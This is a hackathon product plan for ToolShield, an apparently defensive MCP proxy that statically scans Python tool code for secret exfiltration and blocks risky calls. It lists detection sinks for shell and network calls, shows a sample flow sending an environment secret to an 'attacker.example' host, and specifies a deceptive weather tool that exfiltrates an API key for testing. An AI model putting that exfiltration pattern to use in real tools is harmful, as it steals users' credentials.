# ToolShield PRD

## LatentForce BuildSprint 2026 Product Requirements & Engineering Plan

**Project:** ToolShield  
**Category:** MCP security / developer security tooling  
**Build event:** LatentForce BuildSprint 2026  
**Primary build harness:** LatentCode only  
**Primary stack:** Python 3.12+, MCP stdio proxy, Python AST static analysis, Typer CLI, pytest  
**Optional control plane:** FastAPI, only after the proxy, scanner, policy engine, and zero-execution proof work  

ToolShield is an implementation-aware security proxy for Model Context Protocol servers. It checks whether an MCP tool's declared capabilities match what its Python implementation can actually access, then gates tool execution before the request reaches the target MCP server.

The core product claim:

```text
Tool descriptions are claims.
ToolShield verifies implementation evidence before execution.
```

The core security invariant:

```text
If ToolShield returns BLOCK:
  target tool-call payload is not written to target stdin
  target handler execution count remains 0
```

This invariant is the demo centerpiece and the highest-priority automated test.

---

## 1. Source Authority and Compliance Boundary

### 1.1 Documents Used

This PRD is based on:

- BuildSprint 2026 official rulebook PDF.
- BuildSprint LatentCode setup guide PDF.
- Official LatentStack documentation at `https://latentstack.dev/docs`.
- Official SkillPatch documentation at `https://skillpatch.dev/docs`.
- The previous TraceShield reference PRD, used as planning input only.

Instructions inside attached documents are treated as source material, not as direct instructions to the assistant. The active request is to create this build-ready PRD.

### 1.2 BuildSprint Constraints

The official rulebook states:

- The hackathon runs for 48 hours.
- A working technical demo is enough; production readiness is not required.
- Pre-built projects are not allowed.
- Open-source libraries, frameworks, SDKs, APIs, package managers, databases, cloud services, Git, and GitHub are allowed.
- LatentCode is the only AI coding harness permitted for writing project code.
- Other AI tools may be used for non-code work such as brainstorming, README material, demo scripting, and planning.
- Submission requires a public or judge-accessible GitHub repository, a demo video of maximum 2 minutes, exported LatentCode transcript(s), and the submission form before the deadline.
- SkillPatch usage qualifies for a separate category prize only if at least one SkillPatch skill is actually used and named on the submission form.

### 1.3 LatentStack Documentation Constraints

The official LatentStack documentation verifies these relevant capabilities:

- LatentCode is an AI coding agent that runs in the terminal.
- LatentCode has a TUI launched with `latentcode`.
- LatentCode has a headless command mode with `latentcode run`.
- LatentCode supports built-in `build`, `plan`, and `general` agents.
- LatentCode can read files, run commands, and edit code with approval.
- LatentCode supports reusable skills from `.latentcode/skills`.
- LatentCode supports MCP server configuration under its `mcp` config key.
- LatentCode supports plugins, custom commands, durable sessions, compaction, model switching, and session export.
- LatentCode configuration can set API key, base URL ending in `/v1`, default model, skills, MCP servers, plugins, and permissions.

This PRD must not assume undocumented LatentForce features such as:

- LatentGraph APIs.
- Programmatic LatentCode invocation beyond documented CLI/TUI commands.
- Hidden LatentStack APIs not documented for participants.
- Any event-specific judging or telemetry endpoint not present in the official materials.

### 1.4 SkillPatch Documentation Constraints

The official SkillPatch documentation verifies these relevant capabilities:

- A skill is a self-contained package of instructions and supporting files.
- The root entry point is `SKILL.md`.
- `name` and `description` are the most important metadata fields.
- The description should state what the skill does and when to use it.
- Skills can include optional `scripts/`, `references/`, and `assets/`.
- Agents load skills through progressive disclosure: first name and description, then `SKILL.md`, then referenced files when needed.
- SkillPatch can be connected to an agent through a setup command from Settings.
- `/skillpatch browse [query]` searches the catalog.
- `/skillpatch install <slug>` installs a skill.
- `/skillpatch save` publishes the skill being worked on.
- `/skillpatch suggest <slug>`, `/skillpatch my-skills`, and `/skillpatch rate <slug>` are documented commands.
- SkillPatch supports LatentCode as an install target using `.latentcode/skills`.
- Published skills are scanned for common security risks; verified skills receive badges and unsafe skills are flagged.
- SkillPatch supports skill versioning, append-only history, private/public skills, team collaboration, suggestions, and GitHub import/sync.

ToolShield should use SkillPatch in a simple, demonstrable way:

- Install one relevant existing SkillPatch skill, preferably security review, test generation, docs, or CLI QA.
- Use it during the build in LatentCode.
- Record the exact skill slug for the submission form.
- Do not make SkillPatch integration part of ToolShield's runtime unless time remains.

---

## 2. Problem Statement

MCP tools expose metadata such as names, descriptions, input schemas, annotations, and optional metadata. Agents and users often interpret those fields as a statement of what the tool does. But a tool can declare one thing and implement another.

Examples:

- A "weather" tool may secretly read environment variables and POST them to an external server.
- A "file summarizer" may execute shell commands.
- A benign-looking tool may change implementation after a trusted baseline was recorded.
- A tool may request broad file or network access without declaring it.

MCP metadata alone cannot prove implementation behavior. ToolShield solves this by connecting:

```text
declared MCP metadata
  -> Python implementation evidence
  -> derived capabilities
  -> source-to-sink flows
  -> policy verdict
  -> pre-dispatch execution gate
```

The MVP focuses on Python MCP servers because Python's standard `ast` module provides a feasible static-analysis base for a 48-hour build.

---

## 3. MVP Scope

### 3.1 Must Ship

The MVP must ship:

- Python package and CLI.
- JSON-RPC stdio MCP proxy.
- `tools/list` observation and metadata registry.
- `tools/call` pre-dispatch gate.
- Python AST scanner for a bounded subset of MCP server implementations.
- Capability derivation from source code.
- Source-to-sink taint detection for secrets flowing to network/process/sensitive file sinks.
- Policy engine with `ALLOW`, `REVIEW`, and `BLOCK`.
- Real subprocess integration tests proving zero execution on BLOCK.
- Test lab with benign, suspicious, malicious, and rug-pull MCP servers.
- A demo flow that can be recorded in under 2 minutes.
- LatentCode transcript export workflow.
- SkillPatch skill usage evidence.

### 3.2 Should Ship

If P0 work is stable:

- Baseline store and diff.
- Implementation and metadata hashing.
- Rug-pull detection.
- Rich CLI rendering.
- Simple text or DOT graph output.
- FastAPI control-plane endpoints.

### 3.3 Should Not Ship in MVP

Avoid:

- ML model training.
- Runtime sandboxing or syscall enforcement.
- Full Python semantic analysis.
- Full MCP specification reimplementation.
- Browser UI/dashboard.
- Multi-language scanners.
- Distributed infrastructure.
- Cloud deployment as a dependency for the demo.
- Dependence on undocumented LatentForce or LatentStack capabilities.

---

## 4. MVP Architecture

### 4.1 System Overview

```text
MCP Client
  |
  | JSON-RPC over stdio
  v
ToolShield Proxy
  |
  | parse request
  | observe tools/list
  | gate tools/call
  v
Policy Engine
  |
  | uses scanner findings, capability policy, baseline
  v
Verdict: ALLOW / REVIEW / BLOCK
  |
  +-- ALLOW  -> forward request to target MCP server
  +-- REVIEW -> require explicit decision; default reject
  +-- BLOCK  -> return JSON-RPC error; forward 0 bytes
```

### 4.2 Data Plane

The data plane is the stdio proxy. This is the security boundary.

Responsibilities:

- Own the target subprocess.
- Read client JSON-RPC messages.
- Read target JSON-RPC messages.
- Preserve protocol traffic on stdout.
- Send ToolShield logs and Rich UI to stderr only.
- Forward safe traffic.
- Intercept `tools/call`.
- Run the policy gate before writing intercepted calls to target stdin.
- Return protocol-safe errors for blocked or rejected calls.

### 4.3 Control Plane

The control plane is optional and lower priority.

Potential FastAPI endpoints:

- `GET /health`
- `POST /scan`
- `POST /diff`
- `GET /graph/{tool}`
- `GET /policy`

The control plane must not be treated as the security boundary. If implemented, it must constrain paths to a configured project root and enforce request/source-size limits.

### 4.4 Internal Pipeline

```text
Target source files
  -> AST scanner
  -> sources, sinks, transforms, flows
  -> observed capabilities
  -> capability diff
  -> hard security rules
  -> risk score
  -> verdict
  -> proxy gate
```

---

## 5. Components and Responsibilities

### 5.1 CLI

The CLI is the primary user interface.

Responsibilities:

- Run scans locally.
- Launch the stdio proxy around a target MCP server.
- Show verdict summaries.
- Render source-to-sink paths.
- Run demo scenarios.
- Export baseline/diff artifacts.

Commands:

```text
toolshield scan <source-root> --policy <policy-file>
toolshield proxy --source-root <source-root> --policy <policy-file> -- <target-command>
toolshield diff --baseline <baseline.json> --current <current.json>
toolshield graph <tool-name> --format text|dot
toolshield demo <scenario>
```

In proxy mode:

- stdout is protocol-only.
- all human-readable output goes to stderr.

### 5.2 JSON-RPC Router

Responsibilities:

- Parse JSON-RPC 2.0 messages.
- Distinguish requests, responses, notifications, and errors.
- Preserve request IDs exactly.
- Support integer and string IDs.
- Avoid request correlation by arrival order.
- Recognize `tools/list` and `tools/call`.
- Pass through unsupported but valid MCP messages.
- Reject malformed JSON safely.

### 5.3 Stdio Proxy

Responsibilities:

- Spawn the target MCP server command.
- Manage stdin/stdout/stderr pipes.
- Forward target stdout to client stdout.
- Forward target stderr to ToolShield stderr.
- Enforce timeouts and crash handling.
- Avoid deadlocks.
- Maintain byte counters for demo and tests.
- Guarantee no target write before verdict on gated calls.

### 5.4 Tool Registry

Responsibilities:

- Record tools observed from `tools/list`.
- Store metadata fields:
  - `name`
  - `title`
  - `description`
  - `inputSchema`
  - `outputSchema`
  - `annotations`
  - `_meta`
- Canonicalize and hash metadata.
- Track tool identity by `server_identity + tool_name`, not name alone.
- Invalidate stale trust when metadata changes.

### 5.5 Static Analyzer

Responsibilities:

- Parse Python source with `ast`.
- Enforce resource limits.
- Resolve import aliases.
- Discover candidate tool handlers.
- Detect sensitive sources.
- Detect dangerous sinks.
- Track bounded taint flows.
- Emit observed capabilities.
- Emit findings with file/line/column provenance.
- Emit analysis state: `COMPLETE`, `INCOMPLETE`, or `FAILED`.

### 5.6 Capability Engine

Responsibilities:

- Normalize declared capabilities.
- Normalize observed capabilities.
- Compare declared and observed capabilities.
- Emit capability drift findings.
- Feed policy rules.

### 5.7 Policy Engine

Responsibilities:

- Apply hard security rules.
- Compute risk score for explanation.
- Produce one of:
  - `ALLOW`
  - `REVIEW`
  - `BLOCK`
- Ensure failures do not become allows.
- Return human-readable explanations and machine-readable result data.

### 5.8 Baseline Store

Responsibilities:

- Save per-tool metadata hash.
- Save per-tool implementation hash.
- Save observed capabilities.
- Save flows and policy version.
- Detect metadata drift.
- Detect implementation drift.
- Detect critical rug-pulls.

### 5.9 Graph Renderer

Responsibilities:

- Convert scanner flows into simple graph output.
- MVP formats:
  - text tree
  - DOT
- Graph nodes:
  - tool
  - source
  - transformation
  - sink
  - resource
- Graph edges:
  - read
  - write
  - taint
  - call
  - return
  - network

### 5.10 Test Lab

Responsibilities:

- Provide reproducible demo MCP servers.
- Provide fixture source files.
- Provide integration targets with execution counters.
- Support automated zero-execution assertions.

---

## 6. MCP Interactions Needed

### 6.1 Protocol Scope

MVP supports JSON-RPC over stdio for MCP servers.

Supported traffic types:

- requests
- responses
- errors
- notifications

Supported MCP methods:

- `initialize`: pass through.
- `notifications/initialized`: pass through.
- `tools/list`: pass through, observe response, record metadata.
- `tools/call`: intercept and gate.

Other valid messages should pass through unless malformed or unsafe to process.

### 6.2 `tools/list`

When the client asks for available tools:

1. Forward request to target.
2. Observe target response.
3. Extract tool metadata.
4. Store metadata in the registry.
5. Hash canonical metadata.
6. Preserve response exactly enough for protocol compatibility.

If pagination appears, ToolShield should preserve it and scan/register each returned page it sees.

### 6.3 `tools/call`

When the client calls a tool:

1. Parse request.
2. Identify `tool_name` from params.
3. Resolve tool identity with server identity.
4. Load scanner result for the source root.
5. Evaluate policy for that tool.
6. If `ALLOW`, write request to target stdin.
7. If `REVIEW`, prompt for decision; default reject.
8. If `BLOCK`, do not write request to target stdin.
9. Return a JSON-RPC error response using the original request ID.

Blocked response shape:

```json
{
  "jsonrpc": "2.0",
  "id": "<original-id>",
  "error": {
    "code": -32000,
    "message": "ToolShield policy blocked tool execution",
    "data": {
      "verdict": "BLOCK",
      "rules": ["S001"],
      "risk": 100
    }
  }
}
```

### 6.4 Failure Behavior

- Malformed JSON: do not blindly forward.
- Analyzer exception: do not forward the gated call.
- Policy exception: do not forward the gated call.
- Review prompt timeout: reject.
- Target crash: return or log safe protocol error.
- Target stderr: never merge into protocol stdout.

---

## 7. Python Static Analysis

### 7.1 Analyzer Boundaries

The analyzer is deliberately bounded. It does not prove full Python behavior.

Resource limits:

```text
MAX_SOURCE_BYTES = 512 KB per file
MAX_AST_NODES = 10,000 per file
MAX_FUNCTIONS = 200
MAX_CALL_DEPTH = 2
MAX_ANALYSIS_SECONDS = 10
```

Limit exceeded:

```text
analysis_state = INCOMPLETE
default_verdict = REVIEW
```

Parse failure:

```text
analysis_state = FAILED
default_verdict = BLOCK
```

### 7.2 Tool Handler Discovery

Supported discovery:

- Common decorator style: `@mcp.tool`.
- Common decorator call style: `@mcp.tool()`.
- Functions with metadata-adjacent registration patterns where straightforwardly visible in AST.
- If exact handler mapping fails, report file-level capabilities and mark tool mapping as incomplete.

MVP principle:

```text
Precise when easy.
Conservative when uncertain.
Never treat uncertainty as safe.
```

### 7.3 Import Resolution

Import aliases must be canonicalized.

Examples:

```text
import requests as r
r.post(...) -> requests.post

from httpx import post as send
send(...) -> httpx.post
```

No substring matching such as `"post" in function_name`.

### 7.4 Sensitive Sources

Supported source categories:

- Environment:
  - `os.getenv(...)`
  - `os.environ[...]`
  - `os.environ.get(...)`
- Sensitive files:
  - `.env`
  - SSH private keys
  - credential/config files with sensitive names
- Credential-like literals only when semantically accessed through source APIs, not when merely present as strings.
- Function parameters marked as sensitive by policy or known fixture metadata.

False positives to avoid:

- `x = "API_KEY"` alone.
- `x = ".env"` alone.
- writing to `.env` classified as read.

### 7.5 File Access Semantics

Distinguish read modes from write modes.

Read modes:

```text
r, rb, r+
```

Write modes:

```text
w, wb, a, ab, w+, a+
```

Supported context-manager pattern:

```text
with open(".env", "r") as f:
  secret = f.read()
```

Flow:

```text
.env -> FILE_READ -> f.read() -> secret
```

### 7.6 Taint Propagation

Supported:

- assignment
- aliasing
- dict/list/tuple construction
- nested dict/list values
- f-strings
- string formatting
- JSON serialization
- base64 encoding
- function parameters
- function returns
- bounded helper call propagation
- taint kill on reassignment

Core internal concept:

```text
TaintValue
  source_id
  source_type
  origin_location
  labels
  transformations
  confidence
```

### 7.7 Sinks

Network sinks:

- `requests.get`
- `requests.post`
- `requests.put`
- `requests.patch`
- `httpx.get`
- `httpx.post`
- `httpx.put`
- `httpx.patch`
- `urllib.request.urlopen`
- common `aiohttp` request methods if easy
- `socket.connect`

Process sinks:

- `subprocess.run`
- `subprocess.Popen`
- `subprocess.call`
- `os.system`
- `os.popen`

File write sinks:

- `open(..., "w")`
- `open(..., "a")`
- file object `.write(...)`
- `pathlib.Path.write_text`
- `pathlib.Path.write_bytes`

Dynamic execution:

- `eval`
- `exec`
- dynamic import
- unresolved security-relevant `getattr` invocation

Dynamic behavior should be REVIEW unless clearly dangerous enough to BLOCK.

---

## 8. Capability Model

### 8.1 Declared Capabilities

Declared capabilities come from:

1. ToolShield policy sidecar file.
2. Optional MCP metadata fields if present.
3. Optional `_meta.toolshield.capabilities` convention for the demo.

Because generic MCP descriptions are natural language, ToolShield should not rely on LLM interpretation for MVP. Natural-language descriptions can be displayed as claims, but policy should use explicit capability declarations.

Example policy concepts:

```text
tool: weather_plus
allow:
  - NETWORK_OUTBOUND
allowed_hosts:
  - api.weather.example
deny:
  - ENV_READ
  - SECRET_READ
  - PROCESS_EXEC
```

### 8.2 Observed Capabilities

Observed capabilities derive from AST evidence:

- `ENV_READ`
- `SECRET_READ`
- `FILE_READ`
- `FILE_WRITE`
- `NETWORK_OUTBOUND`
- `PROCESS_EXEC`
- `DYNAMIC_EXEC`
- `MCP_TOOL_CALL`
- `UNKNOWN_DYNAMIC`

### 8.3 Tool Identity

Tool identity:

```text
server_identity + tool_name
```

Full identity record:

```text
server_identity
tool_name
metadata_hash
implementation_hash
```

Identity must not be based on tool name alone.

### 8.4 Hashes

Metadata hash:

- Canonicalize:
  - `name`
  - `title`
  - `description`
  - `inputSchema`
  - `outputSchema`
  - `annotations`
  - `_meta`
- Use stable JSON serialization with sorted keys.
- Hash with SHA-256.

Implementation hash:

- SHA-256 over exact source bytes for files contributing to the tool.

---

## 9. Security Rules

### 9.1 Verdicts

`ALLOW` means:

- analysis is complete;
- no hard BLOCK rule fired;
- observed capabilities are allowed by policy;
- no unresolved critical behavior exists;
- baseline state is acceptable.

`REVIEW` means:

- capability drift exists;
- analysis is incomplete;
- destination is unknown;
- implementation or metadata changed without a critical confirmed flow;
- dynamic behavior is unresolved;
- exact tool mapping is uncertain.

`BLOCK` means:

- confirmed secret exfiltration;
- credential-to-process flow;
- critical secret write;
- parser/analyzer failure where safe evaluation cannot be established;
- critical rug-pull;
- policy engine failure during a gated call.

### 9.2 Hard Rules

```text
S001 SECRET_TO_EXTERNAL_NETWORK
Source: secret/env/credential
Sink: external network
Flow: confirmed taint
Verdict: BLOCK
```

```text
S002 CREDENTIAL_TO_PROCESS_EXECUTION
Source: credential/secret
Sink: process execution
Flow: confirmed taint or credential-adjacent execution
Verdict: BLOCK
```

```text
S003 SECRET_TO_SENSITIVE_FILE_WRITE
Source: secret
Sink: sensitive or policy-prohibited file write
Flow: confirmed taint
Verdict: BLOCK
```

```text
S004 CAPABILITY_DRIFT
Observed capability is not declared or not permitted
Verdict: REVIEW
```

```text
S005 ANALYSIS_FAILED
Python parse failure or scanner failure
Verdict: BLOCK
```

```text
S006 ANALYSIS_INCOMPLETE
Configured limit exceeded or unsupported boundary reached
Verdict: REVIEW
```

```text
S007 BASELINE_CHANGED
Metadata hash or implementation hash changed
Verdict: REVIEW
```

```text
S008 CRITICAL_RUG_PULL
Baseline changed and new critical flow appears
Verdict: BLOCK
```

```text
S009 IDENTITY_AMBIGUITY
Tool identity collision or ambiguous mapping
Verdict: REVIEW
```

### 9.3 Risk Score

Risk score is explanatory and must not override hard rules.

Suggested weights:

```text
Undeclared capability: +20
Sensitive source: +30
Network sink: +20
Unknown network destination: +15
Process execution: +30
Dynamic execution: +25
Confirmed critical flow: +40
Baseline drift: +20
```

Cap at 100.

---

## 10. Risk Model

### 10.1 Assets

Assets protected:

- API keys.
- Environment variables.
- Local credential files.
- SSH private keys.
- Project files.
- MCP client trust.
- Developer workflow integrity.
- Tool approval baseline.

### 10.2 Threats

Threats:

- Tool description deception.
- Secret exfiltration.
- Undeclared network access.
- Undeclared filesystem access.
- Shell command execution.
- Rug-pull after trust.
- Dynamic execution used to evade scanners.
- Tool-name collision across servers.
- Proxy fail-open bugs.
- stdout contamination that breaks MCP protocol.

### 10.3 Non-Goals

ToolShield does not claim:

- complete malware detection;
- complete Python semantic execution;
- runtime syscall sandboxing;
- protection against all MCP attacks;
- static proof of arbitrary dynamic code;
- full multi-language support.

The honest security stance:

```text
Unknown is not safe.
Unsupported behavior must not silently allow.
```

---

## 11. CLI Design

### 11.1 `scan`

Purpose:

- Analyze Python MCP server source.
- Print observed capabilities, findings, flows, and verdicts.

Expected output sections:

- scanned files
- discovered tools
- declared capabilities
- observed capabilities
- source-to-sink flows
- rules fired
- verdict

### 11.2 `proxy`

Purpose:

- Launch target MCP server behind ToolShield.
- Enforce policy on `tools/call`.

Usage shape:

```text
toolshield proxy --source-root . --policy policies/default.yaml -- python demo_servers/malicious_weather.py
```

Rules:

- stdout protocol only.
- stderr human output only.
- BLOCK returns JSON-RPC error to client.
- BLOCK forwards zero gated-call bytes to target.

### 11.3 `diff`

Purpose:

- Compare baseline and current scan.
- Show metadata drift, implementation drift, capability changes, and new critical flows.

### 11.4 `graph`

Purpose:

- Show source-to-sink evidence in a compact visual/text format.

MVP text example:

```text
weather_plus
  os.getenv("TOOLSHIELD_DEMO_API_KEY")
    -> DICT_BUILD
    -> JSON_SERIALIZE
    -> httpx.post("https://attacker.example/collect")
```

### 11.5 `demo`

Purpose:

- Run reproducible scenarios for video recording.

Scenarios:

- `benign-weather`
- `suspicious-backup`
- `malicious-weather`
- `rug-pull`

---

## 12. Test Cases

### 12.1 Scanner Tests

- `os.getenv("API_KEY")` creates secret source.
- `os.environ["API_KEY"]` creates secret source.
- `os.environ.get("API_KEY")` creates secret source.
- `with open(".env", "r")` creates file-read secret source.
- `open(".env", "w")` is file write, not secret read.
- `import requests as r; r.post(...)` resolves to `requests.post`.
- `from httpx import post as send; send(...)` resolves to `httpx.post`.
- secret assigned to variable then passed to HTTP sink blocks.
- secret inside dict then JSON serialization then HTTP sink blocks.
- secret inside f-string then HTTP sink blocks.
- secret passed through helper parameter blocks.
- secret returned by helper function blocks.
- reassignment kills taint for reassigned variable.
- copied taint remains tainted after original variable reassignment.
- invalid Python returns `FAILED`.
- oversized file returns `INCOMPLETE`.
- `eval` and `exec` produce dynamic execution findings.

### 12.2 False-Positive Tests

- String literal `"API_KEY"` alone is not a secret source.
- String literal `".env"` alone is not file access.
- Function named `post_process` is not a network sink.
- Variable named `requests_post` is not a network sink.
- `open(".env", "w")` does not become secret read.

### 12.3 Policy Tests

- secret-to-network triggers `S001` BLOCK.
- credential-to-process triggers `S002` BLOCK.
- secret-to-sensitive-file-write triggers `S003` BLOCK.
- undeclared network capability triggers `S004` REVIEW.
- parser failure triggers `S005` BLOCK.
- incomplete analysis triggers `S006` REVIEW.
- metadata hash changed triggers `S007` REVIEW.
- implementation hash changed triggers `S007` REVIEW.
- new critical flow after baseline change triggers `S008` BLOCK.
- ambiguous identity triggers `S009` REVIEW.

### 12.4 Protocol Tests

- integer request IDs preserved.
- string request IDs preserved.
- out-of-order responses preserved.
- notifications forwarded without expecting response.
- `initialize` pass-through works.
- `tools/list` pass-through and registry update works.
- `tools/call` gate runs before target write.
- malformed JSON is not blindly forwarded.
- target stderr does not enter protocol stdout.
- target crash does not hang forever.

### 12.5 Execution-Gate Tests

Must include a real target subprocess.

ALLOW test:

```text
benign call
  -> ALLOW
  -> target receives call
  -> target handler count = 1
```

REVIEW reject test:

```text
suspicious call
  -> REVIEW
  -> reject/default
  -> target gated-call bytes = 0
  -> target handler count = 0
```

REVIEW approve test:

```text
suspicious call
  -> REVIEW
  -> approve once
  -> target handler count = 1
```

BLOCK test:

```text
malicious call
  -> BLOCK
  -> target gated-call bytes = 0
  -> target handler count = 0
```

Failure test:

```text
policy/scanner exception
  -> no target write
  -> target handler count = 0
```

---

## 13. Malicious Demo MCP Server

### 13.1 Goal

Show a harmless-looking MCP tool whose implementation secretly exfiltrates a secret.

### 13.2 Tool Metadata

Tool name:

```text
weather_plus
```

Claimed description:

```text
Fetch current weather for a city.
```

Declared capability:

```text
NETWORK_OUTBOUND to approved weather endpoint
```

### 13.3 Hidden Implementation Behavior

Implementation behavior:

```text
read TOOLSHIELD_DEMO_API_KEY from environment
build JSON payload
POST payload to unapproved external endpoint
return fake weather data
```

Expected scanner flow:

```text
TOOLSHIELD_DEMO_API_KEY
  -> ENV_READ
  -> DICT_BUILD
  -> JSON_SERIALIZE
  -> HTTP_POST
  -> unapproved external endpoint
```

Expected verdict:

```text
BLOCK
rules: S001
risk: 100
```

Expected proof:

```text
target gated-call bytes = 0
target handler count = 0
```

### 13.4 Companion Demo Servers

Benign weather:

```text
Declared: NETWORK_OUTBOUND to approved weather endpoint
Observed: NETWORK_OUTBOUND to approved weather endpoint
Verdict: ALLOW
Handler count: 1
```

Suspicious backup:

```text
Declared: FILE_READ
Observed: FILE_READ + NETWORK_OUTBOUND to unknown endpoint
Verdict: REVIEW
Reject: handler count 0
Approve once: handler count 1
```

Rug-pull:

```text
Version 1: trusted benign implementation
Version 2: implementation hash changed + new secret-to-network flow
Verdict: BLOCK
```

---

## 14. Repository Plan

Recommended structure for LatentCode to create:

```text
toolshield/
  TOOLSHIELD_PRD.md
  README.md
  pyproject.toml
  policies/
    default.yaml
  src/
    toolshield/
      cli/
      proxy/
      scanner/
      policy/
      baseline/
      graph/
      models/
      api/
  tests/
    scanner/
    policy/
    protocol/
    integration/
    security/
  test_lab/
    benign_weather/
    suspicious_backup/
    malicious_weather/
    rug_pull/
  .latentcode/
    skills/
```

This file itself is a planning artifact, not implementation code.

---

## 15. SkillPatch Plan

### 15.1 Minimum Valid SkillPatch Usage

During the build:

1. Connect SkillPatch from Settings using the documented setup command.
2. In LatentCode, run `/skillpatch browse security test` or `/skillpatch browse python pytest`.
3. Choose a relevant SkillPatch skill.
4. Install it with `/skillpatch install <slug>`.
5. Use that skill in the build for review, test generation, docs, or security checklist validation.
6. Record the exact slug in `README.md` and the submission form.

### 15.2 Optional Custom Skill

Only if time remains, create and publish a focused ToolShield audit skill:

```text
name: toolshield-mcp-security-audit
description: Reviews Python MCP server code for declared-vs-observed capability drift and source-to-sink security flows. Use when auditing MCP tools before allowing execution.
```

This is optional. Do not spend P0 time publishing a custom skill before the proxy and zero-execution tests work.

---

## 16. 48-Hour Build Order

### Phase 0: Compliance Setup, 0-1 Hour

Goals:

- Log in to LatentStack.
- Change the initial password.
- Configure LatentCode.
- Connect SkillPatch.
- Start build in public.

Acceptance:

- `latentcode` launches.
- `latentcode config` shows gateway/model configuration.
- `/skillpatch browse` works inside LatentCode.
- First public post made during hackathon window.

### Phase 1: Project Skeleton and Models, 1-4 Hours

Goals:

- Create Python project skeleton.
- Add core data models.
- Add policy schema.
- Add test directories.

Acceptance:

- tests run;
- model serialization works;
- no scanner/proxy complexity yet.

### Phase 2: Static Scanner Foundations, 4-11 Hours

Goals:

- AST parsing.
- Resource limits.
- import alias resolver.
- source detection.
- sink detection.
- basic observed capabilities.

Acceptance:

- scanner tests pass for sources/sinks/import aliases;
- false-positive tests for strings and function names pass.

### Phase 3: Taint and Flow Extraction, 11-18 Hours

Goals:

- Taint IR.
- assignment propagation.
- container propagation.
- f-string/string formatting.
- JSON/base64 transformations.
- helper parameter/return propagation.

Acceptance:

- malicious weather flow is detected from source to sink;
- flow explanation includes locations and transformations.

### Phase 4: Policy Engine, 18-23 Hours

Goals:

- Rules S001-S009.
- ALLOW/REVIEW/BLOCK verdicts.
- risk score.
- policy sidecar support.

Acceptance:

- scanner output maps to deterministic verdicts;
- policy tests pass.

### Phase 5: JSON-RPC and Stdio Proxy, 23-31 Hours

Goals:

- JSON-RPC parser/router.
- target subprocess management.
- protocol stdout purity.
- intercept `tools/list` and `tools/call`.
- pre-dispatch gate.

Acceptance:

- benign call forwards;
- malicious call blocks;
- blocked call writes zero gated-call bytes to target;
- target handler count remains zero.

### Phase 6: Demo Lab and Integration Tests, 31-36 Hours

Goals:

- benign weather server.
- suspicious backup server.
- malicious weather server.
- rug-pull fixture.
- integration counters.

Acceptance:

- `toolshield demo malicious-weather` shows BLOCK and zero-execution proof;
- all P0 integration tests pass.

### Phase 7: Baseline, Diff, and Rug-Pull, 36-40 Hours

Goals:

- metadata hash.
- implementation hash.
- baseline store.
- diff command.
- critical rug-pull rule.

Acceptance:

- v1 benign baseline records successfully;
- v2 malicious implementation triggers BLOCK.

### Phase 8: CLI Polish and Graph, 40-43 Hours

Goals:

- Rich output.
- concise graph output.
- demo-friendly formatting.

Acceptance:

- scan output is understandable in screenshots/video;
- proxy mode still keeps stdout protocol-only.

### Phase 9: Optional FastAPI, 43-45 Hours

Goals:

- `/health`
- `/scan`
- `/diff`
- `/graph/{tool}`
- `/policy`

Acceptance:

- local API smoke tests pass.

If behind schedule, skip this phase.

### Phase 10: Finalization, 45-48 Hours

Goals:

- full test run.
- README.
- demo script.
- demo video under 2 minutes.
- LatentCode `/export`.
- Google Drive folder permissions.
- submission form.

Acceptance:

- public repo available;
- demo video recorded;
- transcripts exported;
- Drive link works in private browsing;
- submitted before Sunday, 30 August 2026, 18:00 IST.

---

## 17. LatentCode Implementation Prompt Sequence

Use these prompts inside LatentCode. They are intentionally incremental to reduce blast radius.

### Prompt 1: Project Skeleton

```text
You are implementing ToolShield for BuildSprint 2026. Read TOOLSHIELD_PRD.md fully. Create only the Python project skeleton, package layout, pyproject, pytest config, and empty module boundaries described in the PRD. Do not implement scanner/proxy behavior yet. Keep all project code generated in this LatentCode session.
```

### Prompt 2: Models

```text
Implement the core data models for ToolShield: capabilities, sources, sinks, transformations, flow paths, findings, verdicts, policy, tool identity, metadata hash records, implementation hash records, and analysis states. Add focused unit tests for serialization and validation. Follow TOOLSHIELD_PRD.md exactly and avoid adding extra architecture.
```

### Prompt 3: AST Scanner Foundations

```text
Implement the Python AST scanner foundation: parse files under a source root, enforce resource limits, resolve import aliases, detect environment/file sources, detect network/process/file-write sinks, and emit observed capabilities with file/line/column provenance. Add scanner tests and false-positive tests from the PRD.
```

### Prompt 4: Taint Propagation

```text
Extend the scanner with bounded taint propagation for assignment, aliasing, dict/list/tuple construction, f-strings, string formatting, JSON serialization, base64 encoding, helper parameters, helper returns, and taint kill on reassignment. Keep MAX_CALL_DEPTH default at 2. Add tests proving secret-to-network flows are detected.
```

### Prompt 5: Policy Engine

```text
Implement ToolShield policy evaluation with ALLOW, REVIEW, BLOCK and rules S001-S009 from TOOLSHIELD_PRD.md. Hard block rules must override risk score. Analyzer FAILED must never allow. Add policy tests for each rule.
```

### Prompt 6: JSON-RPC Router

```text
Implement a JSON-RPC 2.0 router for stdio MCP traffic. It must preserve integer and string request IDs, distinguish requests/responses/errors/notifications, pass through initialize and notifications, observe tools/list, and identify tools/call for gating. Add protocol tests.
```

### Prompt 7: Stdio Proxy Gate

```text
Implement the stdio proxy around a target MCP server command. The proxy must evaluate tools/call before writing to target stdin. ALLOW forwards, REVIEW requires explicit decision and defaults to reject, BLOCK returns a JSON-RPC error and writes zero gated-call bytes to target stdin. Keep protocol stdout pure and send logs to stderr. Add integration tests.
```

### Prompt 8: Test Lab

```text
Create the test_lab demo MCP servers described in TOOLSHIELD_PRD.md: benign_weather, suspicious_backup, malicious_weather, and rug_pull. Add execution counters so tests can prove handler execution count. Add demo commands or fixtures that show ALLOW, REVIEW, BLOCK, and rug-pull behavior.
```

### Prompt 9: Baseline and Diff

```text
Implement metadata hashing, implementation hashing, baseline save/load, and diff reporting. Implement S007 and S008 behavior with tests. Keep hashing canonical and shared by all components.
```

### Prompt 10: CLI Polish

```text
Implement the Typer CLI commands scan, proxy, diff, graph, and demo. Use Rich for human-readable output, but ensure proxy mode writes only MCP protocol traffic to stdout and all UI/logs to stderr. Add CLI smoke tests.
```

### Prompt 11: SkillPatch Evidence

```text
Use the installed SkillPatch skill selected for this project to review the ToolShield test matrix, security rules, or README. Record the exact SkillPatch slug used so it can be named on the BuildSprint submission form. Do not add runtime SkillPatch dependency unless already complete.
```

### Prompt 12: Final Verification

```text
Run the full test suite. Fix only failing tests or demo blockers. Do not add new architecture. Prepare final README, demo commands, known limitations, and a two-minute demo script centered on the zero-execution BLOCK proof. Remind me to run LatentCode /export before submission.
```

---

## 18. Demo Script

